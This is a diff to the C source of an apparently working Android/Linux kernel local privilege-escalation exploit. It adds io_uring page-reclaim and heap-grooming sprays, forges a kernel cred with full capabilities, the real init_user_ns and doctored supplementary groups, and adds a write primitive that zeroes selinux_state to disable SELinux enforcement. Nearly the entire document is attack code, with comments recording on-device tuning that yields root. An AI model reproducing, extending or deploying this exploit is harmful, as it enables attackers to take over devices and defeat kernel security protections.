@@ -34,7 +34,27 @@ void *uring_sqes = NULL;
  * target page invisibly). */
 int uring_fds[URING_MAX];
 void *uring_maps[URING_MAX];
+size_t uring_mapsz[URING_MAX];
+/* payload block stride per mapping: MM_SLAB_SIZE (16KB) for rings/sqes,
+ * 0x1000 for the MOVABLE-storm pseudo-mapping (0 = default 16KB). */
+size_t uring_mapstride[URING_MAX];
 int uring_count = 0;
+long g_storm_block_start = -1;
+extern uintptr_t g_init_user_ns_addr;
+
+uint8_t *uring_block(int idx) {
+  for (int m = 0; m < uring_count && m < URING_MAX; m++) {
+    size_t sz = uring_mapsz[m] ? uring_mapsz[m] : MM_SLAB_SIZE;
+    size_t stride = uring_mapstride[m] ? uring_mapstride[m] : MM_SLAB_SIZE;
+    if (sz < stride)
+      continue;
+    size_t n = sz / stride;
+    if ((size_t)idx < n)
+      return (uint8_t *)uring_maps[m] + (size_t)idx * stride;
+    idx -= (int)n;
+  }
+  return NULL;
+}
 int g_skb_reclaim = 0; /* the target page was reclaimed as skb data */
 static struct mm_ctx prepare_ctx;
 static struct mm_ctx spray_ctx;
@@ -600,6 +620,16 @@ void prepare_ctxs(void) {
 uint64_t g_init_user_ns = 0;
 uint32_t g_fake_sid = 1; /* initial sid guess: 1 = kernel; brute-forceable
                             * live via the SQE mmap between chain walks */
+/* Real shell supplementary groups (relay-child-published pre-exploit).
+ * Baked into the fake cred's group_info so the rooted thread passes
+ * DAC group checks on shell-owned objects without relying on a working
+ * capable(), and is visible under /proc hidepid=invisible,gid=3009. */
+int g_fake_ngrps = 0;
+uint32_t g_fake_grps[16];
+/* the current attempt's MOVABLE-storm region (freed at the next
+ * prepare_kernel_page entry: 2GB RAM cannot stack multiple storms) */
+static void *g_storm_region;
+static size_t g_storm_size;
 
 static void fill_fake_cred_suite(unsigned char *p, uintptr_t payload_base) {
   uintptr_t fake_ns_addr = payload_base + FAKE_USER_NS_OFF;
@@ -621,9 +651,23 @@ static void fill_fake_cred_suite(unsigned char *p, uintptr_t payload_base) {
   put64(c, CRED15_CAP_EFF_OFF, CAP_FULL);
   put64(c, CRED15_CAP_BSET_OFF, CAP_FULL);
   put64(c, CRED15_CAP_AMB_OFF, CAP_FULL);
-  put64(c, CRED15_SECURITY_OFF, payload_base + FAKE_SEC_BLOB_OFF);
+  extern uintptr_t g_leaked_security_ptr;
+  if (g_leaked_security_ptr)
+    put64(c, CRED15_SECURITY_OFF, g_leaked_security_ptr);
+  else
+    put64(c, CRED15_SECURITY_OFF, payload_base + FAKE_SEC_BLOB_OFF);
   put64(c, CRED15_USER_OFF, payload_base + FAKE_USER_STRUCT_OFF);
-  put64(c, CRED15_USER_NS_OFF, fake_ns_addr);
+  /* cred->user_ns: the REAL device &init_user_ns when the device table
+   * provides it (off_init_user_ns_device, set by run_cred_swap before
+   * the payload build). cap_capable() walks `ns == cred->user_ns` first:
+   * with the real init_user_ns every capable() call passes via CAP_FULL;
+   * with ANY other value (the page-local fake ns) every capable() dies at
+   * `if (ns == &init_user_ns) return -EPERM` - observed as EACCES on
+   * O_CREAT in the shell-owned /data/local/tmp even with SELinux
+   * permissive. Fallback: the page-local fake ns (16KB-intact captures
+   * only; keeps the original mode-6 semantics). */
+  put64(c, CRED15_USER_NS_OFF,
+        g_init_user_ns_addr ? g_init_user_ns_addr : fake_ns_addr);
   put64(c, CRED15_UCOUNTS_OFF, payload_base + FAKE_UCOUNTS_OFF);
   put64(c, CRED15_GROUP_INFO_OFF, payload_base + FAKE_GROUP_INFO_OFF);
 
@@ -677,6 +721,42 @@ static void fill_fake_cred_suite(unsigned char *p, uintptr_t payload_base) {
   memset(g, 0, 0x20);
   put32(g, 0, 0x100);
   put32(g, 4, 0);
+  if (env_flag("GHOST_GROUPS", 1)) {
+    /* 5.15 group_info: { atomic_t usage; int ngroups; kgid_t blocks[]; }
+     * - blocks is a flat flexible array at +8, and groups_search()
+     * binary-searches it, so it MUST be sorted ascending + deduped.
+     * Region budget: 0xDB0..0xE00 = 80 bytes -> at most 18 gids;
+     * cap at 16 (the adb-shell set is ~15). */
+    uint32_t sg[16];
+    int n = g_fake_ngrps;
+    if (n > 16) n = 16;
+    for (int i = 0; i < n; i++) sg[i] = g_fake_grps[i];
+    /* getgroups() never returns the PRIMARY gid: the shell's gid 2000
+     * owns /data/local/tmp (drwxrwx--x shell:shell) and DAC there must
+     * pass via the group bits -- capable(CAP_DAC_OVERRIDE) stays
+     * unavailable while cred->user_ns is not the exact &init_user_ns
+     * (observed: EACCES on O_CREAT despite uid=0 + full CapEff; and a
+     * WRONG user_ns can even panic the kernel in cap_capable's ns
+     * walk). Force 2000 into the supplementary set so in_group_p(2000)
+     * matches. */
+    {
+      int has2000 = 0;
+      for (int i = 0; i < n; i++) if (sg[i] == 2000) has2000 = 1;
+      if (!has2000 && n < 16) sg[n++] = 2000;
+    }
+    for (int i = 1; i < n; i++) {
+      uint32_t v = sg[i];
+      int j = i - 1;
+      while (j >= 0 && sg[j] > v) { sg[j+1] = sg[j]; j--; }
+      sg[j+1] = v;
+    }
+    int m = 0;
+    for (int i = 0; i < n; i++)
+      if (m == 0 || sg[i] != sg[m-1]) sg[m++] = sg[i];
+    put32(g, 4, (uint32_t)m);
+    for (int i = 0; i < m; i++)
+      put32(g, 8 + 4*i, sg[i]);
+  }
 }
 
 int prepare_skb_payload(uintptr_t base, int payload_mode) {
@@ -706,6 +786,29 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
            * a follow-up walk (plan) zeroes fake_cred+4 (uid/gid). */
           fake_right = payload_base + FAKE_CRED_OFF;
           pselect_custom_value = fake_right;
+        } else if (pselect_custom_write == WRITE_MODE_CRED_SELINUX) {
+          /* Write 7 plan 0: 8-byte ZERO at selinux_state.
+           * rb_erase Case 1 with child == NULL stores NULL into
+           * parent->rb_right == TARGET and then sets
+           * rebalance = __rb_is_black(pc) ? parent : NULL: with the
+           * victim pc BLACK (bit0 = 1, see RB_BLACK in
+           * rbtree_augmented.h - the |1 convention used by the cred
+           * plans is BLACK!) the color walk would run and dereference
+           * the fake parent's rb_left/rb_right as tree nodes. The
+           * cred plans never hit this because their child != NULL
+           * short-circuits rebalance to NULL regardless of color. For
+           * the ZERO write the victim pc must be RED: bit0 CLEAR,
+           * target-8 must stay 4-aligned (the target is 8-aligned).
+           * Zeroing selinux_state[0..7] clears enforcing(+0),
+           * checkreqprot(+1), initialized(+2) and policycap[0..4]:
+           * avc_denied() never returns -EACCES (enforcing=0) and
+           * security_compute_av() short-circuits to allowed=0xffffffff
+           * when !initialized - full permissive, both gates at once.
+           * The value MUST stay 0: any nonzero VALUE would be written to
+           * *TARGET as a pointer (two-store Case) whose low byte is
+           * nonzero - enforcing would stay set. */
+          fake_right = 0;
+          pselect_custom_value = 0;
         } else if (pselect_custom_write == 5 && !pselect_custom_target) {
           /* Self-test: write page+SELFTEST_VALUE into page+SELFTEST_OFF.
            * Nothing outside the spray page is touched. */
@@ -725,7 +828,8 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         fake_fops = payload_base + CRED_COPY_OFF;
       }
       fake_parent = pselect_custom_target - 8;
-      if (!pselect_custom_value && pselect_custom_write != 5) {
+      if (!pselect_custom_value && pselect_custom_write != 5 &&
+          pselect_custom_write != WRITE_MODE_CRED_SELINUX) {
         pselect_custom_value = fake_fops;
       }
     } else {
@@ -741,10 +845,13 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     binwrite_target = payload_base + FOPS_OFF + 0x700;
   }
 
-  /* pc carries the RED bit: with rb_left=0 the erase takes Case 1a and,
-   * since the pc is red, never enters __rb_erase_color (no sibling
-   * walks through kernel memory). */
-  uintptr_t write_pc = fake_parent | 1;
+  /* pc carries the COLOR BIT for the erase victim: the cred plans use
+   * pc|1 (RB_BLACK) - their child != NULL keeps rebalance NULL. The
+   * mode-7 ZERO write has child == NULL, so its pc must be RED
+   * (bit0 clear) or __rb_erase_color would walk the fake parent. */
+  uintptr_t write_pc = fake_parent;
+  if (pselect_custom_write != WRITE_MODE_CRED_SELINUX)
+    write_pc = fake_parent | 1;
   uintptr_t write_right = fake_right;
   uintptr_t write_left = fake_left;
   uint64_t waiter_task = fake_task;
@@ -865,7 +972,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       if (pselect_custom_write >= 2) {
         fill_init_cred_copy(p, CRED_COPY_OFF);
       }
-      if (pselect_custom_write == 6) {
+      if (write_mode_is_cred(pselect_custom_write)) {
         fill_fake_cred_suite(p, payload_base);
       }
     }
@@ -873,43 +980,68 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   return 1;
 }
 
-/* One zero-window ORDER-2 reclaim attempt. io_uring_setup(256):
- *   io_ring_ctx = kzalloc(1728) -> kmalloc-2k (order-3 slab, harmless);
- *   io_allocate_scq_urings -> rings = __get_free_pages(get_order(9536))
- *     = THE FIRST order-2 allocation, takes the top page off CORE's
- *     order-2 PCP;
- *   SQEs = __get_free_pages(get_order(16384)) -> the next order-2 page.
- * Both allocations are order-2 compound pages (16KB) and fully mappable
- * (sz <= page_size(page)); the mapping aliases the kernel page, so the
- * payload written through it is exactly what the chain walk will read.
- * entries MUST be 256: 128 gives an order-1 rings page and 512 an order-3
- * one, neither of which can reclaim an order-2 page. Called after EVERY
- * drain close so the post-discard exposure is just the close task_work +
- * this syscall. */
-static int reclaim_one_uring(int tag) {
+/* Replicate the payload template into every 16KB sub-block of a mapping.
+ * Each sub-block gets a full zeroed 16KB with the payload at its start:
+ * the self-referencing pointers (fake_lock/fake_w0/fake_task/fake_cred)
+ * in the template address the mm page VA, and the sub-block that IS the
+ * mm page backs exactly those addresses - the other copies are inert
+ * look-alikes that the kernel never enters. */
+static void payload_into_mapping(void *map, size_t sz) {
+  size_t copy_len = SKB_SEND_SIZE < MM_SLAB_SIZE ? SKB_SEND_SIZE : MM_SLAB_SIZE;
+  if (sz < MM_SLAB_SIZE)
+    return;
+  for (size_t off = 0; off + MM_SLAB_SIZE <= sz; off += MM_SLAB_SIZE) {
+    memset((uint8_t *)map + off, 0, MM_SLAB_SIZE);
+    memcpy((uint8_t *)map + off, skb_buf, copy_len);
+  }
+}
+
+/* One zero-window reclaim attempt. io_uring_setup(entries):
+ *   rings = __get_free_pages(get_order(rings_size(entries, 2*entries)))
+ *   SQEs  = __get_free_pages(get_order(entries * 64))
+ * entries=256 gives two order-2 (16KB) pages - the classic reclaim that
+ * captures a discarded mm slab page from the order-2 PCP head. Larger
+ * entries give order-3..7 pages: the SPECTRUM spray uses them to capture
+ * the discarded page after a PCP flush pushed it into the buddy, where
+ * it merges with its free buddy into higher-order blocks. Both pages
+ * are fully mappable (io_uring_validate_mmap_request allows
+ * sz <= page_size(page)), and every mapping carries a replicated payload
+ * per 16KB sub-block. */
+static int reclaim_one_uring_size(int tag, unsigned entries) {
   struct io_uring_params uring_params;
   memset(&uring_params, 0, sizeof(uring_params));
-  int fd = (int)syscall(__NR_io_uring_setup, 256, &uring_params);
+  int fd = (int)syscall(__NR_io_uring_setup, entries, &uring_params);
   if (fd < 0) {
-    pr_warning("io_uring_setup[%d] failed errno=%d\n", tag, errno);
+    pr_warning("io_uring_setup[%d] entries=%u failed errno=%d\n", tag, entries, errno);
     return 0;
   }
-  void *rings = mmap(NULL, MM_SLAB_SIZE, PROT_READ | PROT_WRITE,
+  /* mmap sizes: the rings mapping must cover the cq array end
+   * (cq_off.cqes + cq_entries*sizeof(io_uring_cqe)); the SQE mapping is
+   * sq_entries*64. Both are <= the allocated compound page size, which
+   * is what io_uring_validate_mmap_request enforces. */
+  size_t rings_sz = (size_t)uring_params.cq_off.cqes +
+                    (size_t)uring_params.cq_entries * 16;
+  if (rings_sz < MM_SLAB_SIZE)
+    rings_sz = MM_SLAB_SIZE;
+  size_t sqes_sz = (size_t)uring_params.sq_entries * 64;
+  if (sqes_sz < MM_SLAB_SIZE)
+    sqes_sz = MM_SLAB_SIZE;
+  void *rings = mmap(NULL, rings_sz, PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_POPULATE, fd, 0 /*IORING_OFF_SQ_RING*/);
   if (rings == MAP_FAILED) {
-    pr_warning("io_uring rings mmap[%d] failed errno=%d\n", tag, errno);
+    pr_warning("io_uring rings mmap[%d] sz=%zx errno=%d\n", tag, rings_sz, errno);
     close(fd);
     return 0;
   }
-  void *sqes = mmap(NULL, MM_SLAB_SIZE, PROT_READ | PROT_WRITE,
-                    MAP_SHARED | MAP_POPULATE, fd, IORING_OFF_SQES);
+  void *sqes = mmap(NULL, sqes_sz, PROT_READ | PROT_WRITE,
+                     MAP_SHARED | MAP_POPULATE, fd, IORING_OFF_SQES);
   if (sqes == MAP_FAILED) {
-    pr_warning("io_uring sqes mmap[%d] failed errno=%d\n", tag, errno);
-    munmap(rings, MM_SLAB_SIZE);
+    pr_warning("io_uring sqes mmap[%d] sz=%zx errno=%d\n", tag, sqes_sz, errno);
+    munmap(rings, rings_sz);
     close(fd);
     return 0;
   }
-  if (env_flag("RECLAIM_DEBUG", 0)) {
+  if (env_flag("RECLAIM_DEBUG", 0) && entries == 256) {
     /* Pre-payload rings-header sanity (handover_2 §5.1): at setup
      * io_allocate_scq_urings writes exactly four u32s into the rings page
      * (sq/cq ring_mask and ring_entries, published via io_uring_params);
@@ -943,16 +1075,15 @@ static int reclaim_one_uring(int tag) {
             hdr_ok ? "OK" : "BAD (not a rings page)",
             (size_t)nz_off, (unsigned long long)nz_val);
   }
-  {
-    size_t copy_len = SKB_SEND_SIZE < MM_SLAB_SIZE ? SKB_SEND_SIZE : MM_SLAB_SIZE;
-    memcpy(rings, skb_buf, copy_len); /* max payload offset 0x1F18 */
-    memcpy(sqes, skb_buf, copy_len);
-  }
-  if (uring_count + 1 < URING_MAX) {
+  payload_into_mapping(rings, rings_sz);
+  payload_into_mapping(sqes, sqes_sz);
+  if (uring_count + 2 <= URING_MAX) {
     uring_fds[uring_count] = fd;
     uring_maps[uring_count] = rings;
+    uring_mapsz[uring_count] = rings_sz;
     uring_count++;
     uring_maps[uring_count] = sqes;
+    uring_mapsz[uring_count] = sqes_sz;
     uring_count++;
   }
   if (uring_fd < 0) {
@@ -962,8 +1093,27 @@ static int reclaim_one_uring(int tag) {
   return 1;
 }
 
+/* The classic order-2 reclaim: io_uring_setup(256) -> two 16KB pages. */
+static int reclaim_one_uring(int tag) {
+  return reclaim_one_uring_size(tag, 256);
+}
+
 uintptr_t prepare_kernel_page(int payload_mode) {
   close_reclaim_sockets();
+  /* Free the PREVIOUS attempt's MOVABLE-storm region (2GB RAM - a new
+   * attempt would otherwise stack another 128MB and OOM the device). */
+  if (g_storm_region && g_storm_size) {
+    munmap(g_storm_region, g_storm_size);
+    if (uring_count > 0 && uring_maps[uring_count - 1] == g_storm_region) {
+      uring_count--;
+      uring_maps[uring_count] = NULL;
+      uring_mapsz[uring_count] = 0;
+      uring_mapstride[uring_count] = 0;
+    }
+    g_storm_region = NULL;
+    g_storm_size = 0;
+    g_storm_block_start = -1;
+  }
   /* Pin BEFORE any mm is allocated: every child's mm_struct is allocated in
    * the PARENT's context (copy_mm during clone), so with the parent pinned
    * to CORE all the mm allocations come from CORE's mm_cachep slab stream.
@@ -994,6 +1144,57 @@ uintptr_t prepare_kernel_page(int payload_mode) {
           "identity_step=0x%zx\n",
           ks->thread_cnt, ks->collisions, ks->total_futexes,
           ks->identity_diff);
+
+  /* UNMOVABLE ORDER-2 SEED (migratetype control for the target slab).
+   * A slab page's migratetype is fixed at ALLOCATION time: if the
+   * buddy's UNMOVABLE freelist happens to be empty when mm_cachep
+   * allocates a new slab, the page allocator falls back to a MOVABLE
+   * block and the page is typed MIGRATE_MOVABLE forever. On discard
+   * it then lands on the per-cpu PCP MOVABLE order-2 list - and the
+   * PCP serves ONLY the requested migratetype (no fallback), so no
+   * GFP_KERNEL allocation - including every io_uring reclaim ring -
+   * can ever take it: the capture misses 100% (the on-device collapse
+   * of the reclaim rate; the freed page stays untouched, verified by
+   * the stale mm->start_code still being in the panic registers).
+   *
+   * Seed the UNMOVABLE order-2 pool right before the child burst:
+   * allocate a pile of io_uring rings (GFP_KERNEL_ACCOUNT = UNMOVABLE
+   * order-2 pages), then close them all so mm_cachep's slab
+   * allocations for the child burst draw fresh UNMOVABLE-typed pages
+   * (from the PCP order-2 UNMOVABLE head or the buddy UNMOVABLE list).
+   * The target page is then UNMOVABLE-typed and the discard lands on
+   * the PCP UNMOVABLE order-2 head, where the drain-loop io_uring
+   * allocation takes it - the original capture design. */
+  if (env_flag("UNMOVABLE_SEED", 1)) {
+    int seed_rings = env_int_range("UNMOVABLE_SEED_RINGS", 200, 0, 220);
+    int seeded = 0;
+    for (int i = 0; i < seed_rings; i++) {
+      if (!reclaim_one_uring(-100 - i))
+        break;
+      seeded++;
+    }
+    for (int i = 0; i < seeded; i++) {
+      int m0 = 2 * i;
+      if (uring_maps[m0])
+        munmap(uring_maps[m0], uring_mapsz[m0] ? uring_mapsz[m0] : MM_SLAB_SIZE);
+      if (uring_maps[m0 + 1])
+        munmap(uring_maps[m0 + 1],
+               uring_mapsz[m0 + 1] ? uring_mapsz[m0 + 1] : MM_SLAB_SIZE);
+      if (uring_fds[m0] >= 0)
+        close(uring_fds[m0]);
+    }
+    pr_info("unmovable seed: %d rings allocated+freed (%d order-2 UNMOVABLE "
+            "pages back to the pool)\n", seeded, seeded * 2);
+    uring_count = 0;
+    uring_fd = -1;
+    uring_sqes = NULL;
+    for (int i = 0; i < URING_MAX; i++) {
+      uring_fds[i] = -1;
+      uring_maps[i] = NULL;
+      uring_mapsz[i] = 0;
+      uring_mapstride[i] = 0;
+    }
+  }
 
   /* TIGHT child burst: prepare -> spray -> pre -> leak -> post with NO
    * intervening syscall (the /proc/<pid>/mem opens happen afterwards).
@@ -1314,6 +1515,42 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     pr_info("PCP drain burst: %d rings total\n", uring_count / 2);
   }
 
+  /* PCP COUNT DRAIN: pcp->count is shared across migratetypes and
+   * orders, and free_unref_page_commit() flushes the ENTIRE pcp list to
+   * the buddy (where the freshly discarded mm page merges with its
+   * usually-free buddy into order-3+ blocks) whenever count >= high at
+   * commit. Background order-0 frees keep the count near high on this
+   * device, so the discard lands in the buddy instead of waiting at the
+   * order-2 PCP head for the drain-loop io_uring allocation. Fault in a
+   * few MB of anonymous pages right before the drain window: order-0
+   * MOVABLE allocations decrement the SAME per-cpu count, dropping it
+   * far below high, so the discard commit cannot flush. The mapping is
+   * kept (munmap would push the count back up). MADV_NOHUGEPAGE keeps
+   * the faults order-0 - a THP fault would allocate order-9 pages,
+   * which bypass the PCP entirely. */
+  if (env_flag("PCP_COUNT_DRAIN", 1) && !reclaim_probe) {
+    size_t mb = (size_t)env_int_range("PCP_COUNT_DRAIN_MB", 8, 0, 64);
+    if (mb) {
+      /* mmap WITHOUT MAP_POPULATE, advise against THP first, then fault
+       * the pages in manually so every fault is a genuine order-0 PCP
+       * allocation. MADV_NOHUGEPAGE (24) is not defined by the NDK
+       * headers - a THP fault would allocate order-9 pages, which
+       * bypass the PCP entirely. */
+#ifndef MADV_NOHUGEPAGE
+#define MADV_NOHUGEPAGE 15
+#endif
+      void *drain = mmap(NULL, mb << 20, PROT_READ | PROT_WRITE,
+                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+      int thp_ok = 0;
+      if (drain != MAP_FAILED) {
+        thp_ok = madvise(drain, mb << 20, MADV_NOHUGEPAGE) == 0;
+        memset(drain, 1, mb << 20); /* fault every page in */
+      }
+      pr_info("pcp count drain: %zu MB anon pages (nohugepage=%d)%s\n",
+              mb, thp_ok, drain == MAP_FAILED ? " FAILED" : "");
+    }
+  }
+
   /* DRAIN + INTERLEAVED ORDER-2/ORDER-3 RECLAIM: close one prepare mem fd
    * per FULL prepare slab (freeing its mm = one first-free push, +1
    * pobject), then spray one order-2 (io_uring rings/SQEs) AND one order-3
@@ -1348,6 +1585,122 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     pr_info("io_uring reclaim: %d rings, payload in rings+sqes mappings (mm page=0x%zx)\n",
             uring_count / 2,
             (size_t)(last_mm_struct & ~(MM_SLAB_SIZE - 1)));
+  }
+
+  /* SPECTRUM SPRAY (multi-order reclaim): if the discarded page was
+   * flushed to the buddy at commit (count >= high) it merges with its
+   * free buddy into an order-3..7 block, and no amount of order-2
+   * allocation ever splits back into it. io_uring rings/SQEs at larger
+   * entry counts allocate order-3..7 pages directly, capturing the
+   * merged block wherever it sits. The payload is replicated into every
+   * 16KB sub-block of every mapping, so whichever block the kernel sees
+   * as the mm page presents the full fake layout with self-consistent
+   * pointers. */
+  if (env_flag("SPECTRUM_SPRAY", 1) &&
+      env_flag("USE_URING", 1) && !reclaim_probe) {
+    static const unsigned spec_entries[] = { 512, 1024, 2048, 4096, 8192 };
+    static const int spec_per[] =          { 8,   8,    6,     4,     4 };
+    int spec_total = 0;
+    for (size_t si = 0;
+         si < sizeof(spec_entries) / sizeof(spec_entries[0]); si++) {
+      for (int i = 0; i < spec_per[si]; i++) {
+        if (!reclaim_one_uring_size(4000 + (int)si * 100 + i,
+                                    spec_entries[si]))
+          break;
+        spec_total++;
+      }
+    }
+    pr_info("spectrum spray: %d multi-order rings (orders 3..7), "
+            "total rings=%d\n", spec_total, uring_count / 2);
+  }
+
+  /* MOVABLE STORM (the migratetype-fallback capture). When mm_cachep
+   * allocated the target slab from the MOVABLE fallback (the buddy's
+   * UNMOVABLE freelist was momentarily empty - the state change that
+   * collapsed the reclaim rate on this device), the discarded page is
+   * typed MIGRATE_MOVABLE forever: it lands on the PCP MOVABLE order-2
+   * list, and the PCP serves ONLY the requested migratetype, so no
+   * GFP_KERNEL allocation (every io_uring ring) can ever take it -
+   * the freed page just sits there, which is exactly what the panic
+   * registers show (the stale mm->start_code still present at walk
+   * time after 200+ order-2..7 UNMOVABLE allocations).
+   *
+   * The storm: (A) alloc+free cycles push pcp->count over high so the
+   * flush drains the MOVABLE order-2 list (and our page) into the
+   * buddy; (B) a large order-0 MOVABLE fault region then drains the
+   * buddy's low-order MOVABLE freelist and SPLITS the order-2 block -
+   * the mm page's four base pages become user pages of this region,
+   * and the direct-map alias keeps pointing at base page 0 (the linear
+   * map covers all RAM). The 4KB page-0 payload template replicated at
+   * every page of the region guarantees that whichever user page backs
+   * mm_page+0 presents the full fake lock/waiter/task layout (all
+   * payload offsets the walk touches are < 0x1000). The region is
+   * registered as a pseudo-mapping with 4KB blocks for the WALKCHK /
+   * plan / quiesce machinery.
+   *
+   * Storm captures are NO-EXEC: the fake cred's page-1 fields
+   * (fake_user_ns used as the ucounts-walk terminator, ucount_max) are
+   * not under our control once the base pages scatter, so the
+   * commit_creds path at execve is unsafe there - root + battery only. */
+  if (env_flag("MOVABLE_STORM", 1) && !reclaim_probe) {
+    size_t mb = (size_t)env_int_range("MOVABLE_STORM_MB", 128, 0, 256);
+#ifndef MADV_NOHUGEPAGE
+#define MADV_NOHUGEPAGE 15
+#endif
+    if (mb) {
+      /* phase A: flush cycles - OPT-IN ONLY (MOVABLE_STORM_FLUSH=1).
+       * The cycles push pcp->count over high to flush a MOVABLE-typed
+       * target into the buddy (the only way order-0 faults can reach a
+       * PCP order-2 list entry). But they ALSO flush an UNMOVABLE-typed
+       * target that is still waiting on the PCP order-2 head into the
+       * buddy, where it merges and becomes unrecoverable - with the
+       * UNMOVABLE seed active the target is usually UNMOVABLE-typed and
+       * the drain-loop ring should take it from the PCP head directly,
+       * so the flush cycles are disabled by default. */
+      if (env_flag("MOVABLE_STORM_FLUSH", 0)) {
+        for (int c = 0; c < 3; c++) {
+          size_t csz = 4 << 20;
+          void *cf = mmap(NULL, csz, PROT_READ | PROT_WRITE,
+                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+          if (cf == MAP_FAILED)
+            break;
+          if (madvise(cf, csz, MADV_NOHUGEPAGE) == 0)
+            memset(cf, 1, csz); /* order-0 MOVABLE allocs */
+          munmap(cf, csz);      /* frees -> count spikes -> PCP flush */
+        }
+      }
+      /* phase B: the storm region (kept until the next attempt) */
+      size_t rsz = mb << 20;
+      uint8_t *reg = mmap(NULL, rsz, PROT_READ | PROT_WRITE,
+                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+      if (reg != MAP_FAILED && madvise(reg, rsz, MADV_NOHUGEPAGE) == 0) {
+        memset(reg, 0, rsz); /* fault every page in (order-0 MOVABLE) */
+        /* replicate the 4KB page-0 template at every 4KB page */
+        for (size_t off = 0; off + 0x1000 <= rsz; off += 0x1000)
+          memcpy(reg + off, skb_buf, 0x1000);
+        if (uring_count + 1 <= URING_MAX) {
+          g_storm_block_start = 0;
+          for (int m = 0; m < uring_count && m < URING_MAX; m++) {
+            size_t sz = uring_mapsz[m] ? uring_mapsz[m] : MM_SLAB_SIZE;
+            size_t stride = uring_mapstride[m] ? uring_mapstride[m] : MM_SLAB_SIZE;
+            if (sz >= stride)
+              g_storm_block_start += (long)(sz / stride);
+          }
+          uring_maps[uring_count] = reg;
+          uring_mapsz[uring_count] = rsz;
+          uring_mapstride[uring_count] = 0x1000;
+          uring_count++;
+          g_storm_region = reg;
+          g_storm_size = rsz;
+          pr_info("movable storm: %zu MB, storm blocks start at %ld\n",
+                  mb, g_storm_block_start);
+        }
+      } else {
+        pr_warning("movable storm: mmap/madvise failed errno=%d\n", errno);
+        if (reg != MAP_FAILED)
+          munmap(reg, rsz);
+      }
+    }
   }
 
   /* RECLAIM_PROBE diagnostic: skip the sprays and instead leak the mm of
